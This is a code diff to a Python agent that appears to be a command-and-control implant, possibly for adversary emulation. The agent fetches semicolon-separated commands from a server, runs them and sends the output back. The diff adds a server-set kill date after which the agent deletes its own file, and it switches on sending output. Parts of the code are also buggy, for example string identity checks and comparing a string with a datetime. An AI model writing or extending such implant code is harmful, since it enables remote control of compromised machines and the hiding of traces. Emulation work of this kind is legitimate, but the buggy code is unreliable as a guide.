@@ -16,6 +16,7 @@ headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/
 TIMEOUT = 15
 executed = []
 agent_id = 0
+kill_date_string = ''
 THIS_DIR = Path(__file__).parent
 
 
@@ -104,8 +105,13 @@ def download_and_run_commands():
         # Separates technique's commands into a list separated by ++
         agent_commands = response.split(';')
 
-        for command in agent_commands:
+        for i, command in enumerate(agent_commands):
             if command is '':
+                continue
+            if i == 0:
+                global kill_date_string
+                kill_date_string = command
+                store_kill_date()
                 continue
 
             results.append(execute_command(command))
@@ -137,6 +143,35 @@ def send_output():
     # response = str(req.data.decode('utf-8'))
     # print('Response code: ' + str(req.status))
     # print('Response: ' + response)
+
+
+def store_kill_date():
+    config = configparser.ConfigParser()
+
+    if os.path.exists(path=THIS_DIR / 'config.ini'):
+        config['AGENT'] = {'kill_date': datetime.datetime.strptime(kill_date_string, '%Y-%m-%d %H:%M')}
+        with open('config.ini', 'a') as configfile:
+            config.write(configfile)
+
+
+def confirm_kill():
+    if kill_date_string != '':
+        kill_date = datetime.datetime.strptime(kill_date_string, '%Y-%m-%d %H:%M')
+    else:
+        config = configparser.ConfigParser()
+        if not os.path.exists(path=THIS_DIR / 'config.ini'):
+            config['AGENT'] = {'id': randrange(500)}
+            with open('config.ini', 'w') as configfile:
+                config.write(configfile)
+
+        config.read('config.ini')
+        kill_date = config['AGENT']['kill_date']
+
+    now = datetime.datetime.now()
+
+    if now > kill_date:
+        path = Path(__file__)
+        os.remove(path)
 
 
 # def form():
@@ -177,6 +212,6 @@ if __name__ == '__main__':
     # results = download_and_run_commands()
     # print(results)
     register()
-    # send_output()
+    send_output()
 
 
